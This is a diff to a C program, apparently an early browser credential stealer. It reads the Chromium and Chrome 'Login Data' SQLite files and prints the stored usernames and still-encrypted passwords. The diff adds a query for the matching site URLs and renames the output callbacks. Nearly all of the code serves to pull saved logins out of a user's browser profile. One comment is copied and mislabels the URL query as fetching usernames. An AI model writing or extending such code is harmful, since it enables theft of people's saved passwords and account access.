@@ -9,12 +9,13 @@ char check_file_exists(char *file_path);
 char db_path_chromium[] = "/home/me/.config/chromium/Default/Login Data";
 char db_path_chrome[] = "/home/me/.config/google-chrome/Default/Login Data";
 
+char *get_page_stmt = "SELECT origin_url FROM logins;"; // fetches usernames from logins table
 char *get_user_stmt = "SELECT username_value FROM logins;"; // fetches usernames from logins table
 char *get_pass_stmt = "SELECT password_value FROM logins;"; // fetches passwords from logins table
 
 FILE *out_file;
 
-static int user_callback(void *NotUsed, int argc, char **argv, char **azColName){
+static int plain_callback(void *NotUsed, int argc, char **argv, char **azColName){
 	for(int i = 0; i<argc; i++){
 		printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
 	}
@@ -22,7 +23,7 @@ static int user_callback(void *NotUsed, int argc, char **argv, char **azColName)
 	return 0;
 }
 
-static int pass_callback(void *NotUsed, int argc, char **argv, char **azColName){
+static int encrypted_callback(void *NotUsed, int argc, char **argv, char **azColName){
 	for(int i = 0; i<argc; i++){
 		printf("Undecoded: %s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
 	}
@@ -62,8 +63,9 @@ int main(void){
 
 
 	// compile a SQL statement and put it in 4th parameter
-	status = sqlite3_exec(db_chromium, get_user_stmt, user_callback, 0, &zErrMsg);
-	status = sqlite3_exec(db_chromium, get_pass_stmt, pass_callback, 0, &zErrMsg);
+	status = sqlite3_exec(db_chromium, get_user_stmt, plain_callback, 0, &zErrMsg);
+	status = sqlite3_exec(db_chromium, get_page_stmt, plain_callback, 0, &zErrMsg);
+	status = sqlite3_exec(db_chromium, get_pass_stmt, encrypted_callback, 0, &zErrMsg);
 
 	printf("SQL statement status: %i\n", status);
 
